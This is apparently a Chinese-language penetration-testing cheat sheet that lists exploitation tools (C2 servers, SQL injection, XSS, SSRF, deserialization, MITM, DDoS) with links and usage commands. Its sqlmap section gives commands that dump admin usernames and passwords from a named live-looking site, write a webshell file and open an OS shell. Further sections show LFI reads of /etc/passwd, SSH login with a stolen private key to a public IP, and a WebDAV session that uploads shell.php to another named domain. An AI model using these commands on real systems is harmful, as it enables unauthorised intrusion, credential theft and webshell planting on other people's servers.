漏洞利用
----------------------------------------

C2服务器
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Ninja <https://github.com/ahmedkhlief/Ninja/>`_
- `Covenant <https://github.com/cobbr/Covenant>`_
- `WSC2 <https://github.com/ver007/WSC2>`_
- `Cobalt Strike <https://blog.cobaltstrike.com/category/cobalt-strike-2/>`_
- `GRAT2 <https://github.com/r3nhat/GRAT2.git>`_
- `MeetC2 <https://github.com/CMatri/MeetC2>`_

补丁比对
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Zynamics Bindiff <https://dl.google.com/dl/zynamics/bindiff430.msi>`_
- `turbodiff <https://www.coresecurity.com/corelabs-research/open-source-tools/turbodiff>`_
- `patchdiff2 <https://code.google.com/archive/p/patchdiff2/downloads>`_
- `diaphora <http://diaphora.re/>`_

数据库注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `SQLMap <https://github.com/sqlmapproject/sqlmap>`_
	+ 默认选择不询问用户输入
		``--batch``
	+ 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
		``sqlmap -u http://www.vuln.cn/post.php?id=1  –dbms mysql –level 3``
	+ cookie注入
		``sqlmap -u http://www.baidu.com/shownews.asp –cookie “id=11” –level 2``
	+ 列举数据库管理系统中的用户
		``–users``
	+ 列举并破解数据库管理系统用户密码Hash值
		``--passwords -v 1``
	+ 列举数据库管理系统的用户权限
		``–privileges``
	+ POST注入
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms`` 
	+ POST查找数据库
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms --dbs`` 
	+ POST查找当前的数据库
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms --current-db`` 
	+ POST查找表名
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 --tables`` 
	+ POST查找列名
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 -T admin --columns`` 
	+ POST爆出数据
		``sqlmap -u http://vip.fj0730.cn/login.asp --forms -D vip_0730 -T admin -C user_name,user_pwd --dump`` 
	+ POST指定表单
		``sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb"`` 
	+ POST加载文件
		``sqlmap -r "post.txt" -p n --dbs`` 
	+ POST查找当前数据库
		``sqlmap -u http://vip.fj0730.cn/login.asp --data "userid=aaa&passwd=bbbb" --current-db`` 
	+ 读取与写入文件
		| 首先找需要网站的物理路径，其次需要有可写或可读权限.
		| –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
		| –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
		| –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
		| ``sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”``
	+ 执行命令
		``sqlmap -u http://192.168.159.1/news.php?id=1 --os-cmd=ipconfig`` 
	+ 使用shell命令
		``sqlmap -r “c:\tools\request.txt” -p id –dms mysql –-os-shell``
- `bbqsql <https://github.com/Neohapsis/bbqsql>`_

非结构化数据库注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `NoSQLAttack <https://github.com/youngyangyang04/NoSQLAttack>`_
- `NoSQLMap <https://github.com/codingo/NoSQLMap>`_
- `Nosql Exploitation Framework <https://github.com/torque59/Nosql-Exploitation-Framework>`_
- `MongoDB audit <https://github.com/stampery/mongoaudit>`_

数据库漏洞利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `mysql unsha1 <https://github.com/cyrus-and/mysql-unsha1>`_

XSS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `BeEF <https://github.com/beefproject/beef>`_
- `XSS Reciver <https://github.com/firesunCN/BlueLotus_XSSReceiver>`_
- `DSXS <https://github.com/stamparm/DSXS>`_
- `XSStrike <https://github.com/s0md3v/XSStrike>`_
- `xsssniper <https://github.com/gbrindisi/xsssniper>`_
- `tracy <https://github.com/nccgroup/tracy>`_
- `crlfuzz <https://github.com/dwisiswant0/crlfuzz>`_
- `CRLF-Injection-Scanner <https://github.com/MichaelStott/CRLF-Injection-Scanner>`_

SSRF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `SSRFmap <https://github.com/swisskyrepo/SSRFmap>`_
- `SSRF Proxy <https://github.com/bcoles/ssrf_proxy>`_
- `Gopherus <https://github.com/tarunkant/Gopherus>`_
- `SSRF Testing <https://github.com/cujanovic/SSRF-Testing>`_

模版注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `tplmap <https://github.com/epinna/tplmap>`_

命令注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `commix <https://github.com/commixproject/commix>`_

PHP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Chankro <https://github.com/TarlogicSecurity/Chankro>`_ Herramienta para evadir disable_functions y open_basedir

LFI
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `LFISuite <https://github.com/D35m0nd142/LFISuite>`_
- `FDsploit <https://github.com/chrispetrou/FDsploit>`_
	+ 目录遍历漏洞发现
		| ``python3 fdsploit.py -u http://192.168.100.106/index.php?page=about -d 8``
	+ LFI漏洞发现
		| ``python3 fdsploit.py -u http://192.168.100.106/index.php?page=about -d 7 -k root -p /etc/passwd``
		| -k 响应包中搜索关键字
		| -p 指定包含的文件
		| -d 指定路径包含的深度
- burpsuite
	+ Intruder->Sniper
		::
		
			file=§1§/etc/passwd
			选择Sniper攻击方式，payload type选择Character blocks
			Base string:../
			Min length:0
			Max length:20
			step:1

struts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `struts scan <https://github.com/Lucifer1993/struts-scan>`_

DNS 隧道
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `dnstunnel de <https://dnstunnel.de/>`_
- `iodine <https://code.kryo.se/iodine/>`_
- `dnscat2 <https://github.com/iagox86/dnscat2>`_

XXE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `XXEinjector <https://github.com/enjoiz/XXEinjector>`_
- `XXER <https://github.com/TheTwitchy/xxer>`_

反序列化
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `phpggc <https://github.com/wh1t3p1g/phpggc>`_
- `ysoserial <https://github.com/frohoff/ysoserial>`_
- `JRE8u20 RCE Gadget <https://github.com/pwntester/JRE8u20_RCE_Gadget>`_
- `Java Serialization Dumper <https://github.com/NickstaDB/SerializationDumper>`_
- `gadgetinspector <https://github.com/JackOfMostTrades/gadgetinspector>`_ A byte code analyzer for finding deserialization gadget chains in Java applications

端口Hack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Oracle Database Attacking Tool <https://github.com/quentinhardy/odat>`_
- `nmap vulners <https://github.com/vulnersCom/nmap-vulners>`_
- `nmap nse scripts <https://github.com/cldrn/nmap-nse-scripts>`_
- `Vulnerability Scanning with Nmap <https://github.com/scipag/vulscan>`_

JWT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `jwtcrack <https://github.com/brendan-rius/c-jwt-cracker>`_

无线
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `infernal twin <https://github.com/entropy1337/infernal-twin>`_

中间人攻击
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `mitmproxy <https://github.com/mitmproxy/mitmproxy>`_
- `MITMf <https://github.com/byt3bl33d3r/MITMf>`_
- `ssh mitm <https://github.com/jtesta/ssh-mitm>`_
- `injectify <https://github.com/samdenty99/injectify>`_
- `Responder <https://github.com/lgandx/Responder>`_ Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. 

DHCP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `DHCPwn <https://github.com/mschwager/dhcpwn>`_

DDoS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `Saddam <https://github.com/OffensivePython/Saddam>`_

Bad USB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `WiFiDuck <https://github.com/spacehuhn/WiFiDuck>`_ Keystroke injection attack plattform

ssh公钥登录
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在服务端假如访问到.ssh目录，当服务端配置可以使用公钥登录时，可以拿到公钥id_rsa，然后使用 ``ssh -i id_rsa root@142.93.198.56`` 命令登录。

网站备份文件扫描
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `ihoneyBakFileScan <https://github.com/sry309/ihoneyBakFileScan>`_

payload&bypass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `PayloadsAllTheThings <https://github.com/swisskyrepo/PayloadsAllTheThings>`_

webdav利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- webdav批量扫描：IISPutScanner
- `webdav利用工具 <http://www.webdav.org/cadaver/>`_
	+ ``cadaver http://door.legacyhangtuah.com/webdav/``
	+ 上传webshell: ``put shell.php``